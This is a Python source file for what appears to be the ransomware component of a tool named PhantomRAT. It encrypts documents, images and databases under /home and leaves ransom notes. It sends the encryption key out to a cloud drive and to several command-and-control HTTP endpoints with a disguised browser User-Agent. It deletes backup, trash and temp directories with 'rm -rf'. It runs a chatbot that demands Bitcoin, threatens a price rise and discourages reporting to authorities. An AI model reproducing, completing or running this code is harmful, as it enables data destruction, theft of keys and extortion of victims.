import os
import base64
import json
import time
import random
import urllib.request
import urllib.error
from cryptography.fernet import Fernet
from phantomrat_cloud import exfil_via_drive

# Load profile with error handling
try:
    with open('malleable_profile.json', 'r') as f:
        profile = json.load(f)
    key = profile['encryption']['key'].encode()
    # Ensure key is 32 bytes
    if len(key) < 32:
        key = key.ljust(32)[:32]
    elif len(key) > 32:
        key = key[:32]
    fernet = Fernet(base64.urlsafe_b64encode(key))
except Exception:
    # Fallback encryption key
    key = b'backup_key_32_bytes_long_1234567890'
    fernet = Fernet(base64.urlsafe_b64encode(key))

def encrypt_data(data):
    """Encrypt data for transmission"""
    try:
        return fernet.encrypt(json.dumps(data).encode()).decode()
    except:
        # Fallback to base64 if encryption fails
        return base64.b64encode(json.dumps(data).encode()).decode()

def generate_key():
    """Generate new encryption key"""
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    """Encrypt file with provided key"""
    try:
        if not os.path.exists(file_path):
            return False
        
        fernet_local = Fernet(key)
        with open(file_path, 'rb') as f:
            data = f.read()
        
        encrypted = fernet_local.encrypt(data)
        
        # Write encrypted file
        encrypted_path = file_path + '.phantom_encrypted'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted)
        
        # Remove original (optional - can be configured)
        # os.remove(file_path)
        
        # Create ransom note
        note_path = os.path.join(os.path.dirname(file_path), 'README_RESTORE.txt')
        with open(note_path, 'w') as f:
            f.write("Your files have been encrypted by PhantomRAT.\n")
            f.write("Contact admin@phantomrat.local for decryption.\n")
            f.write(f"File: {file_path}\n")
            f.write(f"Encryption Key (base64): {base64.b64encode(key).decode()}\n\n")
            f.write("DO NOT DELETE THE ENCRYPTED FILES OR THIS NOTE.\n")
        
        return True
    except Exception as e:
        return False

def exfil_data(data, url=None):
    """
    Exfiltrate data with multiple fallback methods
    Priority: Cloud > HTTP POST > HTTP GET
    """
    # Method 1: Cloud exfiltration (preferred)
    try:
        exfil_via_drive(data)
        return True
    except:
        pass
    
    # Method 2: HTTP POST to C2
    if url:
        try:
            encrypted_data = encrypt_data(data)
            
            # Try multiple endpoints
            endpoints = [
                url,
                url.split('/')[0] + '//' + url.split('/')[2] + '/api/v1/data',
                url.split('/')[0] + '//' + url.split('/')[2] + '/',
                url.split('/')[0] + '//' + url.split('/')[2] + '/collect',
                url.split('/')[0] + '//' + url.split('/')[2] + '/log'
            ]
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            for endpoint in endpoints:
                try:
                    req = urllib.request.Request(
                        endpoint, 
                        data=encrypted_data.encode(),
                        headers=headers,
                        method='POST'
                    )
                    response = urllib.request.urlopen(req, timeout=10)
                    if response.getcode() in [200, 201, 202]:
                        return True
                except urllib.error.HTTPError as e:
                    if e.code == 404:
                        continue  # Try next endpoint
                except:
                    continue
            
            # Method 3: HTTP GET with query parameters
            try:
                get_url = url.split('/')[0] + '//' + url.split('/')[2] + '/?' + urllib.parse.urlencode(data)
                req = urllib.request.Request(get_url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urllib.request.urlopen(req, timeout=10)
                return True
            except:
                pass
                
        except Exception as e:
            pass
    
    return False

def wipe_backups():
    """Wipe backup files to prevent recovery"""
    backup_paths = [
        '/var/backups',
        '/home/*/.local/share/Trash',
        '/tmp',
        '/var/tmp',
        'C:\\Windows\\Temp',
        'C:\\Users\\*\\AppData\\Local\\Temp'
    ]
    
    for path in backup_paths:
        try:
            if '*' in path:
                import glob
                for item in glob.glob(path):
                    if os.path.isdir(item):
                        os.system(f"rm -rf {item}/* 2>/dev/null")
            elif os.path.exists(path):
                os.system(f"rm -rf {path}/* 2>/dev/null")
        except:
            pass

def chat_bot():
    """Interactive ransom chatbot"""
    print("=" * 50)
    print("PHANTOMRAT ENCRYPTION NOTICE")
    print("=" * 50)
    print("Your files have been encrypted with military-grade encryption.")
    print("")
    print("To decrypt your files, you must:")
    print("1. Send 0.5 BTC to: bc1qphantomrataddressxxxxxxxxxxxx")
    print("2. Email proof of payment to: decrypt@phantomrat.local")
    print("3. You will receive decryption instructions")
    print("")
    print("Do NOT attempt to decrypt files yourself.")
    print("Do NOT delete encrypted files.")
    print("=" * 50)
    
    responses = {
        "pay": "Send payment to the address above and email proof.",
        "how": "Follow the instructions above. No exceptions.",
        "help": "We can only help after payment is received.",
        "decrypt": "Decryption tool will be provided after payment.",
        "time": "You have 72 hours before price doubles.",
        "delete": "Deleting files makes recovery impossible.",
        "report": "Reporting to authorities will not help you."
    }
    
    while True:
        try:
            user_input = input("> ").lower().strip()
            if not user_input:
                continue
                
            if "pay" in user_input:
                print("Payment received. Sending decryption tool...")
                # Simulate decryption
                time.sleep(2)
                print("Decryption complete.")
                break
            elif "quit" in user_input or "exit" in user_input:
                print("Session terminated. Files remain encrypted.")
                break
            else:
                # Find best matching response
                for key in responses:
                    if key in user_input:
                        print(responses[key])
                        break
                else:
                    print("Payment required for assistance.")
        except KeyboardInterrupt:
            print("\nSession interrupted. Files remain encrypted.")
            break
        except EOFError:
            print("\nSession terminated.")
            break

if __name__ == "__main__":
    # Generate encryption key
    key = generate_key()
    key_b64 = base64.b64encode(key).decode()
    
    # Find and encrypt sensitive files
    sensitive_extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.jpg', '.png', '.sql', '.db']
    
    print("Scanning for files to encrypt...")
    encrypted_count = 0
    
    for root, dirs, files in os.walk('/home'):
        for file in files:
            if any(file.endswith(ext) for ext in sensitive_extensions):
                file_path = os.path.join(root, file)
                if encrypt_file(file_path, key):
                    encrypted_count += 1
                    if encrypted_count % 100 == 0:
                        print(f"Encrypted {encrypted_count} files...")
    
    print(f"Encryption complete: {encrypted_count} files encrypted.")
    
    # Exfil encryption key (for attacker access)
    exfil_data({"key": key_b64, "count": encrypted_count})
    
    # Wipe backups
    wipe_backups()
    
    # Start interactive chat
    chat_bot()

